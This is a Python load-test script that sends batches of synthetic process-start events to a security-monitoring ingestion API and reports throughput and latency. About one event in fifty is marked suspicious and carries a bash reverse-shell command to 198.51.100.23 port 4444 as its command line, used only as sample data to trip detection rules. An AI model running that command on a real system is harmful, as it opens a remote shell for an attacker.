"""Basic ingestion load test.

Sends synthetic ACE events (benign process starts plus a small share that matches rules) to a
running API with an agent token, using several concurrent senders, and reports throughput and
batch latency percentiles. Results depend on hardware and pipeline mode; record them with the
environment they were measured in.

    python tests/perf/ingest_load.py --url http://localhost:8000 --token aga_... \
        --events 20000 --batch 200 --concurrency 4
"""

from __future__ import annotations

import argparse
import asyncio
import random
import statistics
import time
import uuid
from datetime import UTC, datetime

import httpx


def make_event(host: str, i: int) -> dict[str, object]:
    suspicious = i % 50 == 0
    cmd = "bash -i >& /dev/tcp/198.51.100.23/4444 0>&1" if suspicious else f"ls -la /srv/app/{i}"
    return {
        "schema_version": "1.0",
        "event_id": str(uuid.uuid4()),
        "occurred_at": datetime.now(UTC).isoformat(),
        "seq": i,
        "category": "process",
        "action": "start",
        "host": {"hostname": host},
        "user": {"name": random.choice(["deploy", "www-data", "ops"])},  # noqa: S311
        "process": {"pid": 1000 + i % 30000, "ppid": 1, "name": "bash" if suspicious else "ls",
                    "executable": "/usr/bin/bash" if suspicious else "/usr/bin/ls",
                    "command_line": cmd},
    }


async def sender(client: httpx.AsyncClient, token: str, batches: asyncio.Queue[list[dict[str, object]]],
                 latencies: list[float], errors: list[int]) -> None:
    while True:
        try:
            batch = batches.get_nowait()
        except asyncio.QueueEmpty:
            return
        started = time.perf_counter()
        response = await client.post("/api/v1/ingest/events", json={"events": batch},
                                     headers={"authorization": f"Bearer {token}"})
        latencies.append(time.perf_counter() - started)
        if response.status_code != 200:
            errors.append(response.status_code)


async def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://localhost:8000")
    parser.add_argument("--token", required=True)
    parser.add_argument("--host", default="perf-host-01")
    parser.add_argument("--events", type=int, default=20_000)
    parser.add_argument("--batch", type=int, default=200)
    parser.add_argument("--concurrency", type=int, default=4)
    args = parser.parse_args()

    events = [make_event(args.host, i) for i in range(args.events)]
    batches: asyncio.Queue[list[dict[str, object]]] = asyncio.Queue()
    for start in range(0, len(events), args.batch):
        batches.put_nowait(events[start : start + args.batch])
    latencies: list[float] = []
    errors: list[int] = []
    async with httpx.AsyncClient(base_url=args.url, timeout=60) as client:
        started = time.perf_counter()
        await asyncio.gather(*(sender(client, args.token, batches, latencies, errors)
                               for _ in range(args.concurrency)))
        elapsed = time.perf_counter() - started
    latencies.sort()
    pct = lambda p: latencies[min(len(latencies) - 1, int(len(latencies) * p))] * 1000  # noqa: E731
    print(f"events={args.events} batch={args.batch} concurrency={args.concurrency}")
    print(f"elapsed={elapsed:.2f}s throughput={args.events / elapsed:,.0f} events/s")
    print(f"batch latency ms: p50={pct(0.5):.0f} p95={pct(0.95):.0f} max={latencies[-1] * 1000:.0f} "
          f"mean={statistics.mean(latencies) * 1000:.0f}")
    print(f"errors={len(errors)} {sorted(set(errors))}")


if __name__ == "__main__":
    asyncio.run(main())
